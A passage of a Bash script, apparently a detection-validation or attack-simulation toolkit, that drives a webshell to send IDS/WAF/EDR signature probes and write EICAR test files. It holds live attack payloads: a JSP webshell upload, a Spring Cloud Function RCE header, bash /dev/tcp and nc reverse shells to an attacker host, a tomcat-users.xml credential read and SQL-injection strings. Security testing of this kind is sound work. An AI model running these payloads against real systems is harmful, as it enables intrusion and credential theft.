  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
  -d '<% out.println("Webshell"); %>' "\${base}backdoor.jsp/" 2>/dev/null || echo 000)
sig_http_code "\$code" "/backdoor.jsp/" "\$ua"; tomcat_put=1
sig_req "/" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: ids-waf-signature-probe" \\
  -H "spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')" \\
  "\${base}"
spring_hdr=1
sig_req "/cmd.jsp?cmd=bash" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
  "\${base}cmd.jsp?cmd=bash+-i+>%26+/dev/tcp/\${attacker}/4444+0>%261"
edr_cmd=\$((edr_cmd+1))
sig_req "/cmd.jsp?cmd=nc" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
  "\${base}cmd.jsp?cmd=nc+\${attacker}+4444+-e+/bin/sh"
edr_cmd=\$((edr_cmd+1))
sig_req "/cmd.jsp?cmd=cat" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
  "\${base}cmd.jsp?cmd=cat+/usr/local/tomcat/conf/tomcat-users.xml"
edr_cmd=\$((edr_cmd+1))
sig_req "/cmd.jsp?cmd=find" \\
  -H "X-PoC-Campaign: \${campaign}" -H "X-PoC-Mode: edr-cmd-signature-probe" \\
  "\${base}cmd.jsp?cmd=find+/+-name+*properties+-o+-name+*config.xml+2>/dev/null"
edr_cmd=\$((edr_cmd+1))
emit_http_ua_coverage
echo "SIG_PROBE_STATS scheme=${scheme} host=${host} port=${port} attempted=\${at} responses=\${resp} traversal=\${trav} tomcat_put=\${tomcat_put} spring_hdr=\${spring_hdr} edr_cmd=\${edr_cmd} campaign=\${campaign}"
SIG_UA_SCRIPT
EOF
}

run_ids_waf_signature_probe_for_target() {
    local host="$1" port="$2" scheme="$3" out remote_cmd
    read -r host port scheme <<< "$(normalize_http_scan_target_fields "${host}" "${port}" "${scheme}")"
    if [[ "${HAS_curl:-false}" != true ]]; then
        log_message "WARN" "IDS/WAF signature probe skipped for ${host}:${port} — curl missing on webshell host" >&2
        return 1
    fi
    remote_cmd=$(build_ids_waf_signature_probe_remote_cmd "${host}" "${port}" "${scheme}" "${CAMPAIGN_ID}" "${ATTACKER_IP:-127.0.0.1}")
    out=$(run_webshell_long "ids-waf-sig-${scheme}-${host}-${port}" "${remote_cmd}" 2>/dev/null || true)
    ingest_http_attack_remote_output "${out}" "${host}"
    printf '%s' "${out}"
}

format_ids_waf_signature_probe_block() {
    cat <<EOF
IDS/WAF/EDR Signature Probe (detection-rule validation traffic)
- Status                    : ${IDS_WAF_SIG_PROBE_STATUS}
- Active web targets        : ${IDS_WAF_SIG_TARGET_COUNT}
- Signatures attempted      : ${IDS_WAF_SIG_ATTEMPTED}
- HTTP responses received   : ${IDS_WAF_SIG_RESPONSES}
- Traversal signatures      : ${IDS_WAF_SIG_TRAVERSAL}
- Tomcat PUT signature      : ${IDS_WAF_SIG_TOMCAT_PUT}
- Spring header signature   : ${IDS_WAF_SIG_SPRING_HDR}
- EDR cmd.jsp signatures    : ${IDS_WAF_SIG_EDR_CMD}
- HTTPS insecure (-k)       : applied for https targets
- Safety                    : plain-text signature requests only (no reverse-shell execution)
EOF
}

stage_ids_waf_signature_probe() {
    local targets target_line host port scheme out
    local t_attempted=0 t_responses=0 t_traversal=0 t_tomcat=0 t_spring=0 t_edr=0
    local at resp trav tom spring edr idx=0 total=0

    poc_obs_stage_start "IDS/WAF Signature Probe"
    add_executed_stage "IDS/WAF Signature Probe"
    write_report_entries "ids_waf_signature_probe" "T1190/T1059" "IDS/WAF/EDR" "Signature Probe" "multi" "start" "IDS/WAF/EDR plain-text signature HTTP traffic"

    if [[ ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_http_targets.txt" && ! -s "${LOCAL_STATE_DIR}/remote_hosts/reachable_https_targets.txt" ]]; then
        stage_validate_web_reachability || true
    fi

    targets=$(select_active_web_server_targets)
    total=$(printf '%s\n' "${targets}" | awk 'NF{c++} END{print c+0}')
    IDS_WAF_SIG_TARGET_COUNT="${total}"

    if (( total == 0 )); then
        IDS_WAF_SIG_PROBE_STATUS="skipped"
        log_message "WARN" "IDS/WAF signature probe skipped: no active HTTP/HTTPS web servers"
        set_stage_result "IDS/WAF Signature Probe" "Skipped" "no reachable web targets"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "skipped" "no targets"
        poc_obs_stage_end "IDS/WAF Signature Probe"
        return 0
    fi

    log_message "OK" "IDS/WAF signature probe: ${total} active web target(s), 8 signature requests per target (plain-text only)"
    state_append "ids_waf_signature_probe.log" "targets=${total} campaign=${CAMPAIGN_ID}"

    if [[ "${DRY_RUN}" == true ]]; then
        IDS_WAF_SIG_ATTEMPTED=$((total * 8))
        IDS_WAF_SIG_RESPONSES="${IDS_WAF_SIG_ATTEMPTED}"
        IDS_WAF_SIG_TRAVERSAL=$((total * 2))
        IDS_WAF_SIG_TOMCAT_PUT="${total}"
        IDS_WAF_SIG_SPRING_HDR="${total}"
        IDS_WAF_SIG_EDR_CMD=$((total * 4))
        IDS_WAF_SIG_PROBE_STATUS="success"
        set_stage_result "IDS/WAF Signature Probe" "Success" "dry-run planned ${IDS_WAF_SIG_ATTEMPTED} signature requests"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "success" "dry-run"
        poc_obs_stage_end "IDS/WAF Signature Probe"
        return 0
    fi

    while IFS= read -r target_line; do
        [[ -z "${target_line}" ]] && continue
        pipeline_stop_requested && break
        if [[ "${target_line}" == *" "* ]]; then
            read -r host port scheme <<< "${target_line}"
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "http" 2>/dev/null)"; then
            :
        elif read -r host port scheme <<< "$(web_target_parse_line "${target_line}" "https" 2>/dev/null)"; then
            :
        else
            continue
        fi
        idx=$((idx + 1))
        poc_obs_log "INFO" "IDS/WAF Signature Probe: ${idx}/${total} ${scheme}://${host}:${port}"
        out=$(run_ids_waf_signature_probe_for_target "${host}" "${port}" "${scheme}")
        read -r at resp trav tom spring edr <<< "$(parse_sig_probe_stats_line "${out}")"
        sanitize_stats_ints at resp trav tom spring edr
        t_attempted=$((t_attempted + at))
        t_responses=$((t_responses + resp))
        t_traversal=$((t_traversal + trav))
        t_tomcat=$((t_tomcat + tom))
        t_spring=$((t_spring + spring))
        t_edr=$((t_edr + edr))
        state_append "ids_waf_signature_probe.log" "target=${host}:${port} scheme=${scheme} attempted=${at} responses=${resp} traversal=${trav} edr=${edr}"
        poc_obs_log "EVIDENCE" "Signature probe ${host}:${port} attempted=${at} responses=${resp} (traversal=${trav} tomcat_put=${tom} spring=${spring} edr=${edr})"
    done <<< "${targets}"

    IDS_WAF_SIG_ATTEMPTED="${t_attempted}"
    IDS_WAF_SIG_RESPONSES="${t_responses}"
    IDS_WAF_SIG_TRAVERSAL="${t_traversal}"
    IDS_WAF_SIG_TOMCAT_PUT="${t_tomcat}"
    IDS_WAF_SIG_SPRING_HDR="${t_spring}"
    IDS_WAF_SIG_EDR_CMD="${t_edr}"

    if (( t_attempted > 0 )); then
        IDS_WAF_SIG_PROBE_STATUS="success"
        set_stage_result "IDS/WAF Signature Probe" "Success" "targets=${total} attempted=${t_attempted} responses=${t_responses}"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "success" "signatures=${t_attempted}"
        log_message "OK" "$(format_ids_waf_signature_probe_block)"
    else
        IDS_WAF_SIG_PROBE_STATUS="failed"
        set_stage_result "IDS/WAF Signature Probe" "Failed" "no signature requests completed"
        write_report_entries "ids_waf_signature_probe" "T1190" "IDS/WAF" "Signature Probe" "multi" "failed" "no traffic"
        log_message "WARN" "IDS/WAF signature probe produced no completed requests"
    fi
    poc_obs_stage_end "IDS/WAF Signature Probe"
    return 0
}

# ==============================================================================
# EDR Static Signature Detection Test (EICAR + AMTSO CloudCar — files only, no execution)
# ==============================================================================

edr_static_test_log_both() {
    local msg="$1"
    state_append "edr_static_test.log" "${msg}"
    log_message "OK" "${msg}" >&2
}

edr_static_test_eicar_string() {
    printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
}

edr_static_test_cloudcar_string() {
    printf '%s' 'AMTSO-CLOUD-CAR-TEST-FILE-AMTSO-CLOUD-CAR-TEST-FILE-AMTSO-CLOUD-CAR'
}

edr_static_test_shell_escape_single() {
    printf '%s' "${1:-}" | sed "s/'/'\\\\''/g"
}

edr_static_test_file_specs() {
    printf '%s\t%s\n' "eicar_test.txt" "$(edr_static_test_eicar_string)"
    printf '%s\t%s\n' "cloudcar_test.txt" "$(edr_static_test_cloudcar_string)"
    printf '%s\t%s\n' "normal_image.png" "$(edr_static_test_eicar_string)"
    if [[ "${EDR_EXTENDED_FILES}" == true ]]; then
        printf '%s\t%s\n' "eicar_test.com" "$(edr_static_test_eicar_string)"
        printf '%s\t%s\n' "eicar_test.log" "$(edr_static_test_eicar_string)"
    fi
}

edr_static_test_content_to_b64() {
    if base64 -w0 </dev/null >/dev/null 2>&1; then
        printf '%s' "${1:-}" | base64 -w0
    else
        printf '%s' "${1:-}" | base64 | tr -d '\n'
    fi
}

build_edr_static_test_resolve_dir_remote_cmd() {
    local runtime_dir="${REMOTE_RUNTIME_DIR:-/tmp/.poc_runtime_root}"
    local os_type="${EDR_TEST_REMOTE_OS:-linux}"
    if [[ "${os_type}" == windows ]]; then
        cat <<EOF
if command -v powershell >/dev/null 2>&1; then d=\$(powershell -NoProfile -Command "foreach(\$x in @(\$env:TEMP,'C:\\Windows\\Temp')){if(\$x -and (Test-Path -LiteralPath \$x)){Write-Output \$x;break}}" 2>/dev/null | tr -d '\r' | head -n1); [ -n "\${d}" ] && echo "EDR_TEST_FILE_PATH dir=\${d} os=windows"; else echo 'EDR_STATIC_TEST_SUMMARY attempted=0 success=0 failed=0 dir=unwritable'; fi
EOF
        return 0
    fi
    cat <<EOF
edr_dir=""; for d in '${runtime_dir}/edr_test' '/tmp/.poc_runtime_root/edr_test' '/tmp'; do mkdir -p "\${d}" 2>/dev/null && : >"\${d}/.poc_edr_write_test" 2>/dev/null && { rm -f "\${d}/.poc_edr_write_test" 2>/dev/null || true; edr_dir="\${d}"; break; }; done; if [ -n "\${edr_dir}" ]; then echo "EDR_TEST_FILE_PATH dir=\${edr_dir} os=linux"; echo "EDR_TEST_HOST_CONTEXT hostname=\$(hostname 2>/dev/null || true) pwd=\$(pwd 2>/dev/null || true) id=\$(id 2>/dev/null || true)"; else echo 'EDR_STATIC_TEST_SUMMARY attempted=0 success=0 quarantine=0 failed=0 os=linux dir=unwritable'; fi
EOF
}

build_edr_static_test_write_file_remote_cmd() {
    local dir="$1" fn="$2" content="$3"
    local b64 fp_spec
    b64=$(edr_static_test_content_to_b64 "${content}")
    fp_spec="${dir}/${fn}"
    cat <<EOF
fp='${fp_spec}'; if printf '%s' '${b64}' | base64 -d > "\${fp}" 2>/dev/null; then if test -f "\${fp}"; then echo 'EDR_TEST_FILE_CREATE_SUCCESS file=${fn} path='\${fp}; echo 'EDR_TEST_FILE_PATH file=${fn} path='\${fp}; else echo 'EDR_QUARANTINE_SUSPECTED file=${fn} path='\${fp} status=possible_edr_quarantine; fi; else echo 'EDR_TEST_FILE_CREATE_FAILED file=${fn} path='\${fp}; fi
EOF
}

build_edr_static_test_verify_listing_remote_cmd() {
    local dir="${1:-${EDR_TEST_DIR:-}}"
    [[ -z "${dir}" ]] && return 1
    cat <<EOF
echo "EDR_TEST_VERIFY dir=${dir}"; ls -la '${dir}' 2>/dev/null || echo "EDR_TEST_VERIFY listing_failed dir=${dir}"; echo "EDR_TEST_HOST_CONTEXT hostname=\$(hostname 2>/dev/null || true) pwd=\$(pwd 2>/dev/null || true)"
EOF
}

build_edr_static_test_cleanup_remote_cmd() {
    local dir="${EDR_TEST_DIR:-}"
    local fn specs="" cmd=""
    [[ -z "${dir}" ]] && return 1
    while IFS= read -r fn; do
        [[ -z "${fn}" ]] && continue
        specs="${specs} '${dir}/${fn}'"
    done < <(edr_static_test_list_filenames)
    cmd="rm -f${specs} 2>/dev/null; rmdir '${dir}' 2>/dev/null || true"
    printf '%s' "${cmd}"
}

edr_static_test_list_filenames() {
    local line fn _content
    while IFS=$'\t' read -r fn _content; do
        [[ -n "${fn}" ]] && printf '%s\n' "${fn}"
    done < <(edr_static_test_file_specs)
}

# Legacy aggregate builder (resolve + one file) retained for validation smoke tests.
build_edr_static_test_remote_cmd() {
    local sample
    sample=$(build_edr_static_test_write_file_remote_cmd "/tmp/.poc_runtime_root/edr_test" "eicar_test.txt" "$(edr_static_test_eicar_string)")
    printf '%s\n%s' "$(build_edr_static_test_resolve_dir_remote_cmd)" "${sample}"
}

cleanup_edr_static_test_on_exit() {
    local cleanup_cmd=""
    [[ "${EDR_STATIC_TEST_ENABLED}" != true ]] && return 0
    [[ "${EDR_TEST_CLEANUP}" != true ]] && return 0
    [[ "${DRY_RUN}" == true ]] && return 0
    [[ "${KEEP_ARTIFACTS}" == true ]] && return 0
    [[ "${EDR_STATIC_TEST_FILES_CREATED}" != true && -z "${EDR_TEST_DIR}" ]] && return 0
    cleanup_cmd=$(build_edr_static_test_cleanup_remote_cmd) || return 0
    edr_static_test_log_both "EDR_STATIC_TEST_CLEANUP dir=${EDR_TEST_DIR:-n/a} timing=poc_exit retain_during_run=true"
    run_webshell_quick "edr-static-cleanup-exit" "${cleanup_cmd}" >/dev/null 2>&1 || true
}

run_edr_static_test_file_creation() {
    local resolve_cmd resolve_out line fn content file_cmd file_out
    EDR_TEST_FILES_ATTEMPTED=0
    EDR_TEST_FILES_SUCCESS=0
    EDR_TEST_QUARANTINE_SUSPECTED=0
    EDR_TEST_FILES_FAILED=0
    EDR_TEST_FILE_PATHS=""
    EDR_STATIC_TEST_FILES_CREATED=false

    resolve_cmd=$(build_edr_static_test_resolve_dir_remote_cmd)
    resolve_out=$(run_webshell_quick "edr-static-resolve-dir" "${resolve_cmd}" 2>/dev/null || true)
    resolve_out=$(printf '%s' "${resolve_out}" | tr -d '\r')
    parse_edr_static_test_output "${resolve_out}"
    if [[ -z "${EDR_TEST_DIR}" ]]; then
        return 1
    fi

    while IFS=$'\t' read -r fn content; do
        [[ -z "${fn}" ]] && continue
        pipeline_stop_requested && break
        EDR_TEST_FILES_ATTEMPTED=$((EDR_TEST_FILES_ATTEMPTED + 1))
        edr_static_test_log_both "EDR_TEST_FILE_CREATE_ATTEMPT file=${fn} path=${EDR_TEST_DIR}/${fn} os=${EDR_TEST_REMOTE_OS}"
        file_cmd=$(build_edr_static_test_write_file_remote_cmd "${EDR_TEST_DIR}" "${fn}" "${content}")
        if (( ${#file_cmd} > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
            WEBSHELL_METHOD=POST
            EDR_TEST_WEBSHELL_METHOD=POST
        fi
        file_out=$(run_webshell_quick "edr-static-file-${fn}" "${file_cmd}" 2>/dev/null || true)
        file_out=$(printf '%s' "${file_out}" | tr -d '\r')
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            case "${line}" in
                EDR_TEST_FILE_CREATE_SUCCESS*)
                    EDR_TEST_FILES_SUCCESS=$((EDR_TEST_FILES_SUCCESS + 1))
                    EDR_STATIC_TEST_FILES_CREATED=true
                    fpath=$(sed -n 's/.* path=\([^ ]*\).*/\1/p' <<< "${line}")
                    EDR_TEST_FILE_PATHS="${EDR_TEST_FILE_PATHS}${fpath};"
                    edr_static_test_log_both "${line}"
                    ;;
                EDR_QUARANTINE_SUSPECTED*)
                    EDR_TEST_QUARANTINE_SUSPECTED=$((EDR_TEST_QUARANTINE_SUSPECTED + 1))
                    edr_static_test_log_both "${line}"
                    ;;
                EDR_TEST_FILE_CREATE_FAILED*)
                    EDR_TEST_FILES_FAILED=$((EDR_TEST_FILES_FAILED + 1))
                    edr_static_test_log_both "${line}"
                    ;;
            esac
        done <<< "${file_out}"
    done < <(edr_static_test_file_specs)

    if [[ -n "${EDR_TEST_DIR}" ]]; then
        local verify_cmd verify_out
        verify_cmd=$(build_edr_static_test_verify_listing_remote_cmd "${EDR_TEST_DIR}")
        verify_out=$(run_webshell_quick "edr-static-verify-listing" "${verify_cmd}" 2>/dev/null || true)
        verify_out=$(printf '%s' "${verify_out}" | tr -d '\r')
        while IFS= read -r line; do
            [[ -z "${line}" ]] && continue
            case "${line}" in
                EDR_TEST_VERIFY*|EDR_TEST_HOST_CONTEXT*)
                    edr_static_test_log_both "${line}"
                    ;;
            esac
        done <<< "${verify_out}"
        edr_static_test_log_both "EDR_TEST_NOTE files exist on webshell-host filesystem only (search host /tmp if tomcat/docker — may need container exec)"
    fi
    return 0
}

parse_edr_static_test_output() {
    local out="$1"
    local line
    EDR_TEST_FILES_ATTEMPTED=0
    EDR_TEST_FILES_SUCCESS=0
    EDR_TEST_QUARANTINE_SUSPECTED=0
    EDR_TEST_FILES_FAILED=0
    EDR_TEST_REMOTE_OS=unknown
    EDR_TEST_DIR=""
    EDR_TEST_FILE_PATHS=""
    while IFS= read -r line; do
        [[ -z "${line}" ]] && continue
        case "${line}" in
            EDR_TEST_FILE_CREATE_ATTEMPT*)
                EDR_TEST_FILES_ATTEMPTED=$((EDR_TEST_FILES_ATTEMPTED + 1))
                ;;
            EDR_TEST_FILE_CREATE_SUCCESS*)
                EDR_TEST_FILES_SUCCESS=$((EDR_TEST_FILES_SUCCESS + 1))
                ;;
            EDR_QUARANTINE_SUSPECTED*)
                EDR_TEST_QUARANTINE_SUSPECTED=$((EDR_TEST_QUARANTINE_SUSPECTED + 1))
                ;;
            EDR_TEST_FILE_CREATE_FAILED*)
                EDR_TEST_FILES_FAILED=$((EDR_TEST_FILES_FAILED + 1))
                ;;
            EDR_TEST_FILE_PATH\ dir=*)
                EDR_TEST_DIR=$(sed -n 's/.* dir=\([^ ]*\).*/\1/p' <<< "${line}")
                EDR_TEST_REMOTE_OS=$(sed -n 's/.* os=\([^ ]*\).*/\1/p' <<< "${line}")
                ;;
            EDR_TEST_FILE_PATH\ file=*)
                local fpath
                fpath=$(sed -n 's/.* path=\([^ ]*\).*/\1/p' <<< "${line}")
                EDR_TEST_FILE_PATHS="${EDR_TEST_FILE_PATHS}${fpath};"
                ;;
            EDR_TEST_HOST_CONTEXT*)
                edr_static_test_log_both "${line}"
                ;;
            EDR_TEST_VERIFY*)
                edr_static_test_log_both "${line}"
                ;;
            EDR_STATIC_TEST_SUMMARY*)
                EDR_TEST_FILES_ATTEMPTED=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_FILES_SUCCESS=$(safe_int "$(sed -n 's/.*success=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_QUARANTINE_SUSPECTED=$(safe_int "$(sed -n 's/.*quarantine=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_FILES_FAILED=$(safe_int "$(sed -n 's/.*failed=\([0-9][0-9]*\).*/\1/p' <<< "${line}")")
                EDR_TEST_REMOTE_OS=$(sed -n 's/.* os=\([^ ]*\).*/\1/p' <<< "${line}")
                EDR_TEST_DIR=$(sed -n 's/.* dir=\([^ ]*\).*/\1/p' <<< "${line}")
                local paths_field
                paths_field=$(sed -n 's/.* paths=\([^ ]*\).*/\1/p' <<< "${line}")
                [[ -n "${paths_field}" && "${paths_field}" != "paths=" ]] && EDR_TEST_FILE_PATHS="${paths_field}"
                ;;
        esac
    done <<< "${out}"
}

finalize_edr_static_test_judgment() {
    local stage_label="${1:-EDR Static Signature Detection Test}"
    local detail_prefix="${2:-}"
    if [[ "${WEBSHELL_CHANNEL_BROKEN}" == true ]]; then
        EDR_STATIC_STAGE_STATUS="Failed"
        set_stage_result "${stage_label}" "Failed" "${detail_prefix}webshell command execution failed"
        return 1
    fi
    if (( EDR_TEST_FILES_SUCCESS > 0 || EDR_TEST_QUARANTINE_SUSPECTED > 0 )); then
        if (( EDR_TEST_FILES_FAILED > 0 )) || (( EDR_TEST_FILES_SUCCESS > 0 && EDR_TEST_QUARANTINE_SUSPECTED > 0 && EDR_TEST_FILES_SUCCESS + EDR_TEST_QUARANTINE_SUSPECTED < EDR_TEST_FILES_ATTEMPTED )); then
            EDR_STATIC_STAGE_STATUS="Partial"
            set_stage_result "${stage_label}" "Partial" "${detail_prefix}attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED} failed=${EDR_TEST_FILES_FAILED}"
            return 0
        fi
        EDR_STATIC_STAGE_STATUS="Success"
        set_stage_result "${stage_label}" "Success" "${detail_prefix}attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED} os=${EDR_TEST_REMOTE_OS}"
        return 0
    fi
    if (( EDR_TEST_FILES_ATTEMPTED == 0 )); then
        EDR_STATIC_STAGE_STATUS="Failed"
        set_stage_result "${stage_label}" "Failed" "${detail_prefix}no file create attempts (dir=${EDR_TEST_DIR:-unwritable})"
        return 1
    fi
    EDR_STATIC_STAGE_STATUS="Failed"
    set_stage_result "${stage_label}" "Failed" "${detail_prefix}attempted=${EDR_TEST_FILES_ATTEMPTED} success=0 failed=${EDR_TEST_FILES_FAILED}"
    return 1
}

format_edr_static_test_block() {
    cat <<EOF
EDR Static Signature Detection Test (EICAR + AMTSO CloudCar — create only, no execution)
- Status                    : ${EDR_STATIC_STAGE_STATUS}
- Files attempted           : ${EDR_TEST_FILES_ATTEMPTED}
- Files created             : ${EDR_TEST_FILES_SUCCESS}
- Quarantine suspected      : ${EDR_TEST_QUARANTINE_SUSPECTED}
- Create failed             : ${EDR_TEST_FILES_FAILED}
- Remote OS                 : ${EDR_TEST_REMOTE_OS}
- Test directory            : ${EDR_TEST_DIR:-n/a}
- File paths                : ${EDR_TEST_FILE_PATHS:-n/a}
- Webshell URL              : ${WEB_SHELL_URL:-n/a}
- Webshell method           : ${EDR_TEST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}}
- Extended files (.com/.log): ${EDR_EXTENDED_FILES}
- Cleanup on PoC exit        : ${EDR_TEST_CLEANUP} (files retained during run; removed at script exit)
- Safety                    : official EICAR/AMTSO test strings only; files created, never executed
EOF
}

write_edr_static_test_report() {
    [[ -z "${REPORT_MD}" ]] && return 0
    cat <<EOF >> "${REPORT_MD}" 2>/dev/null || true

## EDR Static Signature Detection Test

| Metric | Value |
|---|---|
| Stage status | ${EDR_STATIC_STAGE_STATUS} |
| Files attempted | ${EDR_TEST_FILES_ATTEMPTED} |
| Files created | ${EDR_TEST_FILES_SUCCESS} |
| Quarantine suspected | ${EDR_TEST_QUARANTINE_SUSPECTED} |
| Create failed | ${EDR_TEST_FILES_FAILED} |
| Remote OS | ${EDR_TEST_REMOTE_OS} |
| Test directory | ${EDR_TEST_DIR:-n/a} |
| Webshell URL | ${WEB_SHELL_URL:-n/a} |
| Webshell method | ${EDR_TEST_WEBSHELL_METHOD:-${WEBSHELL_METHOD:-GET}} |
| Extended files | ${EDR_EXTENDED_FILES} |
| Cleanup on PoC exit | ${EDR_TEST_CLEANUP} |

### Test file paths
$(printf '%s' "${EDR_TEST_FILE_PATHS:-n/a}" | tr ';' '\n' | sed '/^$/d' | sed 's/^/- /')

### Expected detections
- EICAR Test File
- AMTSO CloudCar Test File
- Suspicious Test File Creation
- File Created Then Immediately Removed
- Potential AV/EDR Quarantine Event

EOF
}

edr_static_test_webshell_exec_failed() {
    local out="$1" payload="$2" http_code="${3:-${WEBSHELL_LAST_HTTP_CODE:-000}}"
    local low=""
    low=$(printf '%s' "${out}" | tr '[:upper:]' '[:lower:]')
    if [[ "${http_code}" == "000" ]]; then
        return 0
    fi
    if [[ -z "${out}" ]] && (( ${#payload} > PAYLOAD_WARN_BYTES )); then
        return 0
    fi
    if [[ "${low}" == *"command timed out"* || "${low}" == *"killed"* ]]; then
        return 0
    fi
    if [[ -z "${out}" && "${http_code}" =~ ^2[0-9][0-9]$ ]]; then
        return 0
    fi
    [[ "${out}" != *"EDR_STATIC_TEST_START"* && "${out}" != *"EDR_STATIC_TEST_SUMMARY"* ]]
}

stage_edr_static_detection_test() {
    local remote_cmd out payload_bytes saved_ws_method="" stage_status="" detail=""
    poc_obs_stage_start "EDR Static Signature Detection Test"
    add_executed_stage "EDR Static Signature Detection Test"
    write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "start" "EICAR+CloudCar file create (no execution)"

    if [[ "${EDR_STATIC_TEST_ENABLED}" != true ]]; then
        EDR_STATIC_STAGE_STATUS="Skipped"
        set_stage_result "EDR Static Signature Detection Test" "Skipped" "disabled via --disable-edr-static-test"
        write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "skipped" "disabled"
        poc_obs_stage_end "EDR Static Signature Detection Test"
        return 0
    fi

    edr_static_test_log_both "EDR_STATIC_TEST_START url=${WEB_SHELL_URL:-n/a} extended=${EDR_EXTENDED_FILES} cleanup_on_exit=${EDR_TEST_CLEANUP} retain_during_run=true purpose=PoC-EDR-static-signature-validation"

    if [[ "${DRY_RUN}" == true ]]; then
        local planned=3
        [[ "${EDR_EXTENDED_FILES}" == true ]] && planned=5
        EDR_TEST_FILES_ATTEMPTED="${planned}"
        EDR_TEST_FILES_SUCCESS="${planned}"
        EDR_TEST_REMOTE_OS="linux"
        EDR_TEST_DIR="${REMOTE_RUNTIME_DIR:-/tmp/.poc_runtime_root}/edr_test"
        EDR_STATIC_STAGE_STATUS="Success"
        edr_static_test_log_both "EDR_STATIC_TEST_SUMMARY attempted=${planned} success=${planned} quarantine=0 failed=0 os=linux dry_run=true"
        set_stage_result "EDR Static Signature Detection Test" "Success" "dry-run planned ${planned} official test files"
        write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "success" "dry-run"
        poc_obs_stage_end "EDR Static Signature Detection Test"
        return 0
    fi

    detect_webshell_remote_os
    EDR_TEST_REMOTE_OS="${ICMP_REMOTE_OS:-unknown}"

    saved_ws_method="${WEBSHELL_METHOD:-GET}"
    EDR_TEST_WEBSHELL_METHOD="${WEBSHELL_METHOD:-GET}"
    run_edr_static_test_file_creation
    WEBSHELL_METHOD="${saved_ws_method}"

    if [[ -z "${EDR_TEST_DIR}" ]] && (( EDR_TEST_FILES_ATTEMPTED == 0 )); then
        WEBSHELL_CHANNEL_BROKEN=true
        poc_log_root_cause_analysis "EDR" "resolve-dir" "no writable edr dir" "${WEBSHELL_LAST_HTTP_CODE:-000}"
        edr_static_test_log_both "ROOT_CAUSE_ANALYSIS module=EDR webshell command execution failed — subsequent webshell follow-ups will be skipped"
        EDR_STATIC_STAGE_STATUS="Failed"
        set_stage_result "EDR Static Signature Detection Test" "Failed" "no writable edr test directory on webshell host"
        write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" "failed" "dir unwritable"
        poc_obs_stage_end "EDR Static Signature Detection Test"
        return 0
    fi

    edr_static_test_log_both "EDR_STATIC_TEST_SUMMARY attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED} failed=${EDR_TEST_FILES_FAILED} os=${EDR_TEST_REMOTE_OS} dir=${EDR_TEST_DIR:-n/a} paths=${EDR_TEST_FILE_PATHS:-n/a} cleanup_on_exit=${EDR_TEST_CLEANUP}"
    finalize_edr_static_test_judgment "EDR Static Signature Detection Test" "" || true
    stage_status="${EDR_STATIC_STAGE_STATUS}"
    write_report_entries "edr_static_detection_test" "T1204.002" "EDR/AV/XDR" "Static Signature Detection" "webshell-host" \
        "$([[ "${stage_status}" == Success || "${stage_status}" == Partial ]] && printf success || printf partial)" \
        "attempted=${EDR_TEST_FILES_ATTEMPTED} success=${EDR_TEST_FILES_SUCCESS} quarantine=${EDR_TEST_QUARANTINE_SUSPECTED}"
    log_message "OK" "$(format_edr_static_test_block)"
    poc_obs_stage_end "EDR Static Signature Detection Test"
    return 0
}

resolve_http_followup_mode() {
    if [[ "${HAS_curl:-false}" == true ]]; then
        HTTP_FOLLOWUP_MODE="curl"
        EXPECTED_HTTP_DETECTION_IMPACT="high"
    elif [[ "${HAS_python3:-false}" == true ]]; then
        HTTP_FOLLOWUP_MODE="python"
        EXPECTED_HTTP_DETECTION_IMPACT="high"
    else
        HTTP_FOLLOWUP_MODE="tcp-fallback"
        EXPECTED_HTTP_DETECTION_IMPACT="low"
    fi
}

sync_http_followup_counter_aliases() {
    HTTP_FOLLOWUP_ATTEMPTED="${HTTP_REQUESTS_ATTEMPTED}"
    HTTP_FOLLOWUP_CONNECTED="${HTTP_CONNECTED}"
}

# --- HTTP User-Agent pools (url_scan burst: 0% normal / 50% rare / 50% payload) ---
http_ua_pick_payload_fragment_local() {
    case $((RANDOM % 4)) in
        0)
            case $((RANDOM % 9)) in
                0) printf '%s' "' OR 1=1--" ;;
                1) printf '%s' '" OR 1=1--' ;;
                2) printf '%s' "1' OR '1'='1" ;;
                3) printf '%s' '1 OR 2+701-701-1=0+0+0+1' ;;
                4) printf '%s' '(select convert(int,char(65)))' ;;
                5) printf '%s' 'select pg_sleep(3)' ;;
